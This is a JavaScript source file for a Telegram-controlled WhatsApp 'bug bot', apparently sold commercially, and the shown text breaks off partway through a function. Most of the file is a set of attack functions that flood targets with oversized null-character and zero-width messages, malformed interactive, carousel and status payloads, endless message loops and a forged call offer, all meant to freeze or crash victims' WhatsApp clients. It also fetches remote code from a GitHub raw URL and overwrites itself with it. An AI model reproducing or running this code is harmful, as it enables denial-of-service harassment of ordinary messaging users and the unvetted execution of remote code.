const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const {
  default: makeWASocket,
  DisconnectReason,
  generateWAMessageFromContent,
  useMultiFileAuthState,
} = require("@denzz221/baileys");
const fs = require("fs");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const axios = require("axios");
const { exec } = require("child_process");
const BOT_TOKEN = config.BOT_TOKEN;
const chalk = require("chalk");
const PREMIUM_FILE = "./database/premium.json";
const BLOCKED_COMMANDS_FILE = "./database/blocked_commands.json";
const BOT_MODE_FILE = "./database/bot_mode.json";
const GROUP_ONLY_FILE = "./database/group_only.json";

// Load blocked commands
function loadBlockedCommands() {
  try {
    if (!fs.existsSync(BLOCKED_COMMANDS_FILE)) {
      fs.writeFileSync(BLOCKED_COMMANDS_FILE, JSON.stringify([]));
      return [];
    }
    return JSON.parse(fs.readFileSync(BLOCKED_COMMANDS_FILE));
  } catch (error) {
    console.error("Error loading blocked commands:", error);
    return [];
  }
}

function saveBlockedCommands(commands) {
  try {
    fs.writeFileSync(BLOCKED_COMMANDS_FILE, JSON.stringify(commands, null, 2));
  } catch (error) {
    console.error("Error saving blocked commands:", error);
  }
}

// Load bot mode (on = maintenance / off = normal)
function loadBotMode() {
  try {
    if (!fs.existsSync(BOT_MODE_FILE)) {
      fs.writeFileSync(BOT_MODE_FILE, JSON.stringify({ mode: "off" }));
      return { mode: "off" };
    }
    return JSON.parse(fs.readFileSync(BOT_MODE_FILE));
  } catch (error) {
    console.error("Error loading bot mode:", error);
    return { mode: "off" };
  }
}

function saveBotMode(mode) {
  try {
    fs.writeFileSync(BOT_MODE_FILE, JSON.stringify({ mode: mode }));
  } catch (error) {
    console.error("Error saving bot mode:", error);
  }
}

// Load group only mode (on = only group / off = group + private)
function loadGroupOnly() {
  try {
    if (!fs.existsSync(GROUP_ONLY_FILE)) {
      fs.writeFileSync(GROUP_ONLY_FILE, JSON.stringify({ mode: "off" }));
      return { mode: "off" };
    }
    return JSON.parse(fs.readFileSync(GROUP_ONLY_FILE));
  } catch (error) {
    console.error("Error loading group only:", error);
    return { mode: "off" };
  }
}

function saveGroupOnly(mode) {
  try {
    fs.writeFileSync(GROUP_ONLY_FILE, JSON.stringify({ mode: mode }));
  } catch (error) {
    console.error("Error saving group only:", error);
  }
}

function loadPremiumUsers() {
  try {
    if (!fs.existsSync(PREMIUM_FILE)) {
      fs.writeFileSync(PREMIUM_FILE, JSON.stringify([]));
      return [];
    }
    return JSON.parse(fs.readFileSync(PREMIUM_FILE));
  } catch (error) {
    console.error("Error loading premium users:", error);
    return [];
  }
}

function savePremiumUsers(users) {
  try {
    fs.writeFileSync(PREMIUM_FILE, JSON.stringify(users, null, 2));
  } catch (error) {
    console.error("Error saving premium users:", error);
  }
}

async function getBuffer(url) {
  try {
    const res = await axios.get(url, { responseType: "arraybuffer" });
    return res.data;
  } catch (error) {
    console.error(error);
    throw new Error("Gagal mengambil data.");
  }
}

const sessions = new Map();
const activeProcesses = new Map();
const SESSIONS_DIR = "./sessions";
const ACTIVE_SESSIONS_FILE = "./sessions/active_sessions.json";
let blockedCommands = loadBlockedCommands();
let botMode = loadBotMode();
let groupOnly = loadGroupOnly();

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function startBot() {
  console.log(chalk.red(`
hahahhaha yes bro tanks for buying 
`));
  console.log(chalk.red(`Happy For Bugging Men
`));
  console.log(chalk.blue(`
[ ⚡bot is running... ]
`));
}

function validateToken() {
  if (!BOT_TOKEN || BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
    console.error(chalk.red("Error: BOT_TOKEN tidak valid!"));
    process.exit(1);
  }
  startBot();
}

validateToken();

const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);
  return `${hours}h ${minutes}m ${seconds}s`;
};

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Fungsi generate message ID
function generateMessageId() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let result = '';
  for (let i = 0; i < 16; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

// ================= FITUR ANTI CONNECTION CLOSED ================= //

// Fungsi untuk reconnect dan mendapatkan socket yang valid
async function getValidSocket(retries = 3) {
  for (let attempt = 0; attempt < retries; attempt++) {
    if (sessions.size > 0) {
      for (const [number, sock] of sessions) {
        try {
          if (sock && sock.user && sock.ws && sock.ws.readyState === 1) {
            return sock;
          }
        } catch (e) {}
      }
    }
    await sleep(2000);
  }
  return null;
}

// Fungsi untuk mereconnect semua sesi
async function reconnectAllSessions() {
  console.log(chalk.yellow("🔄 Mencoba reconnect semua sesi..."));
  for (const [number, sock] of sessions) {
    try {
      await reconnectWhatsApp(number);
    } catch (e) {}
  }
  await sleep(3000);
}

// Wrapper untuk semua fungsi bug dengan auto-reconnect
async function withAutoReconnect(sock, target, func) {
  let currentSock = sock;
  let retries = 3;
  
  for (let attempt = 0; attempt < retries; attempt++) {
    try {
      if (!currentSock || !currentSock.user || (currentSock.ws && currentSock.ws.readyState !== 1)) {
        console.log("⚠️ Socket tidak valid, mencari socket baru...");
        currentSock = await getValidSocket();
        if (!currentSock) {
          await reconnectAllSessions();
          currentSock = await getValidSocket();
        }
        if (!currentSock) {
          await sleep(3000);
          continue;
        }
      }
      
      await func(currentSock, target);
      return true;
      
    } catch (error) {
      console.log(`❌ Error attempt ${attempt + 1}/${retries}:`, error.message);
      
      if (error.message?.includes('Connection Closed') || 
          error.output?.statusCode === 428 ||
          error.message?.includes('closed')) {
        console.log("🔄 Koneksi terputus, mencoba reconnect...");
        await reconnectAllSessions();
        currentSock = await getValidSocket();
        await sleep(2000);
      } else {
        await sleep(1000);
      }
    }
  }
  
  console.log("❌ Gagal setelah", retries, "percobaan");
  return false;
}

// Middleware untuk cek group only
function checkGroupOnlyMiddleware(ctx, next) {
  const groupOnlyMode = loadGroupOnly();
  const isOwnerUser = isOwner(ctx.from.id);
  
  if (groupOnlyMode.mode === "on" && ctx.chat.type === "private" && !isOwnerUser) {
    return;
  }
  return next();
}

// Middleware untuk cek bot mode (maintenance)
function checkBotModeMiddleware(ctx, next) {
  const botModeData = loadBotMode();
  const isOwnerUser = isOwner(ctx.from.id);
  
  if (botModeData.mode === "on" && !isOwnerUser) {
    return;
  }
  return next();
}

// Middleware untuk cek command blocked
function checkCommandBlocked(commandName, ctx) {
  const blocked = loadBlockedCommands();
  if (blocked.includes(commandName)) {
    return true;
  }
  return false;
}

// Fungsi untuk menyimpan sesi aktif
function saveActiveSession(botNumber) {
  try {
    let activeSessions = [];
    if (fs.existsSync(ACTIVE_SESSIONS_FILE)) {
      activeSessions = JSON.parse(fs.readFileSync(ACTIVE_SESSIONS_FILE));
    }
    if (!activeSessions.includes(botNumber)) {
      activeSessions.push(botNumber);
      fs.writeFileSync(ACTIVE_SESSIONS_FILE, JSON.stringify(activeSessions, null, 2));
    }
  } catch (error) {
    console.error("Error saving active session:", error);
  }
}

// Fungsi untuk menghapus sesi aktif
function removeActiveSession(botNumber) {
  try {
    if (fs.existsSync(ACTIVE_SESSIONS_FILE)) {
      let activeSessions = JSON.parse(fs.readFileSync(ACTIVE_SESSIONS_FILE));
      activeSessions = activeSessions.filter(num => num !== botNumber);
      fs.writeFileSync(ACTIVE_SESSIONS_FILE, JSON.stringify(activeSessions, null, 2));
    }
  } catch (error) {
    console.error("Error removing active session:", error);
  }
}

// Fungsi untuk memuat ulang semua sesi WhatsApp yang tersimpan
async function reloadAllWhatsAppSessions() {
  console.log(chalk.yellow("🔄 Memuat ulang sesi WhatsApp yang tersimpan..."));
  
  try {
    if (!fs.existsSync(SESSIONS_DIR)) {
      fs.mkdirSync(SESSIONS_DIR, { recursive: true });
      console.log(chalk.yellow("📁 Membuat direktori sessions..."));
      return;
    }

    let activeSessions = [];
    if (fs.existsSync(ACTIVE_SESSIONS_FILE)) {
      activeSessions = JSON.parse(fs.readFileSync(ACTIVE_SESSIONS_FILE));
    }

    if (activeSessions.length === 0) {
      console.log(chalk.yellow("Tidak ada sesi WhatsApp yang tersimpan."));
      return;
    }

    console.log(chalk.cyan(`📱 Ditemukan ${activeSessions.length} sesi WhatsApp yang tersimpan`));

    for (const botNumber of activeSessions) {
      console.log(chalk.yellow(`🔄 Menghubungkan kembali WhatsApp: ${botNumber}`));
      await reconnectWhatsApp(botNumber);
    }

    console.log(chalk.green(`✅ Berhasil memuat ulang ${sessions.size} sesi WhatsApp`));
  } catch (error) {
    console.error("Error reloading sessions:", error);
  }
}

// Fungsi untuk reconnect WhatsApp
async function reconnectWhatsApp(botNumber) {
  const sessionDir = SESSIONS_DIR;
  
  try {
    const credsPath = path.join(sessionDir, 'creds.json');
    if (!fs.existsSync(credsPath)) {
      console.log(chalk.red(`❌ File creds.json untuk ${botNumber} tidak ditemukan`));
      removeActiveSession(botNumber);
      return null;
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: P({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
      keepAliveIntervalMs: 60000,
      connectTimeoutMs: 60000,
    });

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === "close") {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        console.log(chalk.red(`❌ Koneksi WhatsApp ${botNumber} terputus:`, statusCode));
        
        if (statusCode !== DisconnectReason.loggedOut && statusCode !== 403) {
          console.log(chalk.yellow(`🔄 Mencoba reconnect ${botNumber} dalam 10 detik...`));
          setTimeout(() => reconnectWhatsApp(botNumber), 10000);
        } else if (statusCode === 403) {
          console.log(chalk.red(`🚫 WhatsApp ${botNumber} diblokir, hapus sesi`));
          removeActiveSession(botNumber);
        } else {
          console.log(chalk.red(`🚫 WhatsApp ${botNumber} logged out, hapus sesi`));
          removeActiveSession(botNumber);
        }
      } else if (connection === "open") {
        sessions.set(botNumber, sock);
        console.log(chalk.green(`✅ WhatsApp ${botNumber} berhasil terhubung kembali!`));
      } else if (connection === "connecting") {
        console.log(chalk.yellow(`⏳ Menghubungkan WhatsApp ${botNumber}...`));
      }
    });

    sock.ev.on("creds.update", saveCreds);
    
    return sock;
  } catch (error) {
    console.error(`Error reconnect WhatsApp ${botNumber}:`, error);
    return null;
  }
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`
╭─────────────────
│    MEMULAI    
│────────────────
│ Bot: ${botNumber}
│ Status: Inisialisasi...
╰─────────────────\`\`\``,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = SESSIONS_DIR;
  if (!fs.existsSync(sessionDir)) {
    fs.mkdirSync(sessionDir, { recursive: true });
  }

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
    keepAliveIntervalMs: 60000,
    connectTimeoutMs: 60000,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`
╭─────────────────
│    RECONNECTING    
│────────────────
│ Bot: ${botNumber}
│ Status: Mencoba menghubungkan...
╰─────────────────\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        setTimeout(() => connectToWhatsApp(botNumber, chatId), 10000);
      } else if (statusCode === DisconnectReason.loggedOut || statusCode === 403) {
        await bot.editMessageText(
          `\`\`\`
╭─────────────────
│    SESSION EXPIRED    
│────────────────
│ Bot: ${botNumber}
│ Status: Silakan /addbot ulang
╰─────────────────\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        removeActiveSession(botNumber);
        try {
          if (fs.existsSync(path.join(sessionDir, 'creds.json'))) {
            fs.unlinkSync(path.join(sessionDir, 'creds.json'));
          }
        } catch (error) {
          console.error("Error deleting creds:", error);
        }
      } else {
        await bot.editMessageText(
          `\`\`\`
╭─────────────────
│    KONEKSI GAGAL    
│────────────────
│ Bot: ${botNumber}
│ Status: Mencoba ulang...
╰─────────────────\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        setTimeout(() => connectToWhatsApp(botNumber, chatId), 15000);
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSession(botNumber);
      await bot.editMessageText(
        `\`\`\`
╭─────────────────
│    TERHUBUNG    
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil terhubung!
╰─────────────────\`\`\``,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await sleep(1000);
      try {
        if (!fs.existsSync(path.join(sessionDir, 'creds.json'))) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `\`\`\`
╭─────────────────
│    KODE PAIRING    
│────────────────
│ Bot: ${botNumber}
│ Kode: ${formattedCode}
╰─────────────────\`\`\``,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
}

// ================= BUG FUNCTIONS (SEMUA DIKIRIM KE TARGET) ================= //

async function VsxCrashDelay(sock, target) {
  await withAutoReconnect(sock, target, async (s, t) => {
    await s.sendMessage(t, { text: "\u0000".repeat(900000) });
  });
}

async function DelayHard(sock, target) {
  await withAutoReconnect(sock, target, async (s, t) => {
    await s.sendMessage(t, { text: "x".repeat(800000) });
  });
}

async function StickerFC(sock, target) {
  await withAutoReconnect(sock, target, async (s, t) => {
    await s.sendMessage(t, { sticker: { url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true" } });
  });
}

async function Freeze(sock, target) {
  await withAutoReconnect(sock, target, async (s, t) => {
    await s.relayMessage(t, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "FREEZE", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "cta_FREEZE",
              paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(500000)}\"}}`,
              version: 3
            }
          }
        }
      }
    }, { participant: { jid: t } });
  });
}

async function invisfcmsg(sock, target) {
  await withAutoReconnect(sock, target, async (s, t) => {
    await s.sendMessage(t, { text: "\u200b".repeat(800000) });
  });
}

async function VnXDelayXFcNew(sock, target) {
  await withAutoReconnect(sock, target, async (s, t) => {
    await s.relayMessage(t, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "VnX", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "cta_VnX",
              paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900009)}\"}}`,
              version: 3,
              contextInfo: {
                isForwarded: true,
                forwardingScore: 999,
                quotedMessage: {
                  stickerMessage: {
                    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
                    fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                    fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                    mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                    mimetype: "image/webp",
                    directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                    fileLength: "10610",
                    mediaKeyTimestamp: "1775044724",
                    stickerSentTs: "1775044724091"
                  }
                }
              }
            }
          }
        }
      }
    }, { participant: { jid: t } });
  });
}

async function delaynewinvisibleVnX(sock, target) {
  await withAutoReconnect(sock, target, async (s, t) => {
    while (true) {
      try {
        const MsgNew = {
          groupStatusMessageV2: {
            message: {
              interactiveResponseMessage: {                     
                body: {
                  text: "VnXNgelay",
                  format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                  name: "galaxy_message",
                  paramsJson: "\u0000".repeat(400000),
                  version: 3
                },
                entryPointConversionSource: "call_permission_request"
              }
            }
          }
        };

        await s.relayMessage(t, MsgNew, { participant: { jid: t } });
        console.log(`✅ VnX Sent to ${t}`);
        await sleep(1200);
      } catch (e) {
        console.log("❌ Error:", e.message);
        await sleep(5000);
      }
    }
  });
}

async function VisiNoob(sock, target) {
  await withAutoReconnect(sock, target, async (s, t) => {
    for (let i = 0; i < 50; i++) {
      await s.sendMessage(t, { text: "\u200e".repeat(600000) });
      await sleep(100);
    }
  });
}

// ================= FUNGSI ORDER SECRET ================= //

async function OrderSecret(sock, target) {
  await withAutoReconnect(sock, target, async (s, t) => {
    const RuxzSecret = {
      orderMessage: {
        orderId: "4U7S4RWPS3C",
        itemCount: 99999999,
        status: "CANCELLED",
        surface: 2,
        sellerJid: "x",
        totalAmount1000: 99999999,
        currencyCodeIso4217: "IDR",
        orderValue: "Rp",
        contextInfo: {
          stanzaId: "3EB0F1A2B3C4D5E6",
          participant: t,
          quotedMessage: null,
          mentionedJid: Array.from({ length: 100 }, (_, r) => `6285983729${r + 1}@s.whatsapp.net`)
        }
      }
    };

    for (let i = 0; i < 30; i++) {
      await s.relayMessage(
        "status@broadcast",
        RuxzSecret,
        {
          messageId: generateMessageId(),
          statusJidList: [t],
          additionalNodes: [
            {
              tag: "meta",
              attrs: {},
              content: [
                {
                  tag: "mentioned_users",
                  attrs: {},
                  content: [
                    {
                      tag: "to",
                      attrs: { jid: t },
                      content: undefined
                    }
                  ]
                }
              ]
            }
          ]
        }
      );
      console.log(`✅ OrderSecret sent to ${t} (${i + 1}/30)`);
      await sleep(1000);
    }
  });
}

// ================= FUNGSI FC NEW ================= //

async function FcNeww(sock, target) {
  await withAutoReconnect(sock, target, async (s, t) => {
    const myJid = s.user?.id?.split(':')[0] + '@s.whatsapp.net';
    if (!myJid || t === myJid) return;

    const fcMessage = {
      viewOnceMessage: {
        message: {
          carouselMessage: {
            cards: [
              {
                header: {
                  title: '\u0000.VnX'.repeat(500),
                  hasMediaAttachment: true,
                  stickerMessage: {
                    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
                    fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                    fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                    mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                    mimetype: "image/webp",
                    directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                    fileLength: "10610",
                    mediaKeyTimestamp: "1775044724",
                    stickerSentTs: "1775044724091"
                  }
                }
              }
            ]
          }
        }
      }
    };

    await s.relayMessage(t, fcMessage, {
      participant: { jid: t }
    });

    console.log(`✅ FcNeww sent to ${t}`);
  });
}

// ================= FUNGSI FC CALL INVIS NEW ================= //

async function FcCallInvisnew(sock, target) {
  await withAutoReconnect(sock, target, async (s, t) => {
    const {
      encodeSignedDeviceIdentity,
      jidDecode,
      encodeWAMessage,
    } = require("@denzz221/baileys");
    
    let devices = (
      await s.getUSyncDevices([t], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await s.assertSessions(devices);

    let privt = () => {
      let map = {};
      return {
        mutex(key, fn) {
          map[key] ??= { task: Promise.resolve() };
          map[key].task = (async prev => {
            try { await prev; } catch {}
            return fn();
          })(map[key].task);
          return map[key].task;
        }
      };
    };

    let vion = privt();
    let vionv1 = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let vionoc = s.encodeWAMessage?.bind(s);

    const originalCreateParticipantNodes = s.createParticipantNodes.bind(s);
    
    s.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
      if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

      let patched = await (s.patchMessageBeforeSending?.(message, recipientJids) ?? message);
      let memeg = Array.isArray(patched)
        ? patched
        : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

      let { id: meId, lid: meLid } = s.authState.creds.me;
      let omak = meLid ? jidDecode(meLid)?.user : null;
      let shouldIncludeDeviceIdentity = false;

      let nodes = await Promise.all(memeg.map(async ({ recipientJid: jid, message: msg }) => {
        let { user: targetUser } = jidDecode(jid);
        let { user: ownPnUser } = jidDecode(meId);
        let isOwnUser = targetUser === ownPnUser || targetUser === omak;
        let y = jid === meId || jid === meLid;
        if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

        let bytes = vionv1(vionoc ? vionoc(msg) : encodeWAMessage(msg));

        return vion.mutex(jid, async () => {
          let { type, ciphertext } = await s.signalRepository.encryptMessage({ jid, data: bytes });
          if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
          return {
            tag: 'to',
            attrs: { jid },
            content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
          };
        });
      }));

      return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
    };

    let { nodes: destinations, shouldIncludeDeviceIdentity } = await s.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

    let vionlast = {
      tag: "call",
      attrs: { to: t, id: s.generateMessageTag(), from: s.user.id },
      content: [{
        tag: "offer",
        attrs: {
          "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
          "call-creator": s.user.id
        },
        content: [
          { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
          { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
          {
            tag: "video",
            attrs: {
              orientation: "0",
              screen_width: "1920",
              screen_height: "1080",
              device_orientation: "0",
              enc: "vp8",
              dec: "vp8"
            }
          },
          { tag: "net", attrs: { medium: "3" } },
          { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
          { tag: "encopt", attrs: { keygen: "2" } },
          { tag: "destination", attrs: {}, content: destinations },
          ...(shouldIncludeDeviceIdentity ? [{
            tag: "device-identity",
            attrs: {},
            content: encodeSignedDeviceIdentity(s.authState.creds.account, true)
          }] : [])
        ]
      }]
    };
    await s.sendNode(vionlast);

    const msg2 = {
      groupStatusMessageV2: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
            fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
            fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
            mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
            mimetype: "image/webp",
            directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
            fileLength: "10610",
            mediaKeyTimestamp: "1775044724",
            stickerSentTs: "1775044724091"
          }
        }
      }
    };

    await s.relayMessage(t, msg2, {
      participant: { jid: t },
      messageId: null,
      userJid: t,
      quoted: null
    });
    
    s.createParticipantNodes = originalCreateParticipantNodes;
    
    console.log(`✅ FcCallInvisnew sent to ${t}`);
  });
}

// ================= HELPER FUNCTIONS ================= //

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

function isPremium(userId) {
  try {
    const premiumUsers = loadPremiumUsers();
    return premiumUsers.includes(userId.toString());
  } catch (error) {
    console.error("Error checking premium status:", error);
    return false;
  }
}

// ================= FITUR UPDATE GITHUB ================= //

const GITHUB_RAW_URL = "https://raw.githubusercontent.com/sihalohoalexander389-oss/LINUXUPDATE/main/index.js";

async function checkGitHubUpdate() {
  try {
    const response = await axios.get(GITHUB_RAW_URL, { timeout: 10000 });
    const remoteContent = response.data;
    const localContent = fs.readFileSync(__filename, "utf8");
    
    if (remoteContent.trim() !== localContent.trim()) {
      return { hasUpdate: true, remoteContent: remoteContent };
    }
    return { hasUpdate: false, remoteContent: null };
  } catch (error) {
    console.error("Error checking GitHub update:", error);
    return { hasUpdate: false, remoteContent: null, error: error.message };
  }
}

async function performFullUpdate(chatId) {
  try {
    await bot.sendMessage(chatId, "🔄 Memeriksa update dari GitHub...");
    
    const updateCheck = await checkGitHubUpdate();
    
    if (!updateCheck.hasUpdate) {
      await bot.sendMessage(chatId, "✅ Tidak ada update tersedia. Bot sudah versi terbaru.");
      return false;
    }
    
    await bot.sendMessage(chatId, "📥 Update ditemukan! Mengunduh dan menginstal...");
    
    fs.writeFileSync(__filename, updateCheck.remoteContent);
    
    await bot.sendMessage(chatId, "🔄 Restarting bot... Mohon tunggu 5 detik.");
    
    setTimeout(() => {
      process.exit(0);
    }, 2000);
    
    return true;
  } catch (error) {
    console.error("Error performing full update:", error);
    await bot.sendMessage(chatId, `❌ Gagal update: ${error.message}`);
    return false;
  }
}

// ================= FITUR UPDATE CMD ================= //

async function updateCommandOnly(cmdName, loopCount, sleepMs) {
  try {
    let content = fs.readFileSync(__filename, "utf8");
    
    const commandRegex = new RegExp(`bot\\.onText\\(\\/\\/${cmdName}\\(\\?:\\s\\+(\\\\.+)\\)\\?/, async \\(msg, match\\) => \\{([\\s\\S]*?)for \\(let i = 0; i < (\\d+); i\\+\\+\\) \\{([\\s\\S]*?)\\n    \\}([\\s\\S]*?)\\n\\}\\);`, 'g');
    
    let matchFound = commandRegex.exec(content);
    if (!matchFound) {
      return false;
    }
    
    const oldLoopCount = matchFound[3];
    const loopBody = matchFound[4];
    
    const newLoopCode = `    for (let i = 0; i < ${loopCount}; i++) {${loopBody}    }`;
    
    const oldLoopRegex = new RegExp(`for \\(let i = 0; i < ${oldLoopCount}; i\\+\\+\\) \\{[\\s\\S]*?\\n    \\}`);
    const newContent = content.replace(oldLoopRegex, newLoopCode);
    
    fs.writeFileSync(__filename, newContent);
    return true;
  } catch (error) {
    console.error("Error updating command only:", error);
    return false;
  }
}

async function updateCommandWithNewFunction(cmdName, loopCount, sleepMs, functionBody, functionName) {
  try {
    let content = fs.readFileSync(__filename, "utf8");
    
    const existingFunctionCheck = new RegExp(`async function ${functionName}\\s*\\(`, 'g');
    if (!existingFunctionCheck.test(content)) {
      const bugFunctionsSection = "// ================= BUG FUNCTIONS (SEMUA DIKIRIM KE TARGET) ================= //";
      const insertPoint = content.indexOf(bugFunctionsSection);
      
      if (insertPoint !== -1) {
        const lines = content.split('\n');
        let lastFunctionLine = insertPoint;
        for (let i = insertPoint; i < lines.length; i++) {
          if (lines[i].startsWith('async function') || (lines[i].includes('async function') && lines[i].includes('{'))) {
            lastFunctionLine = i;
          }
          if (lines[i].includes('// ================= HELPER FUNCTIONS')) {
            break;
          }
        }
        
        const finalFunctionBody = functionBody.includes('async function') ? functionBody : `async ${functionBody}`;
        const functionCode = finalFunctionBody + '\n\n';
        lines.splice(lastFunctionLine + 1, 0, functionCode);
        content = lines.join('\n');
      }
    }
    
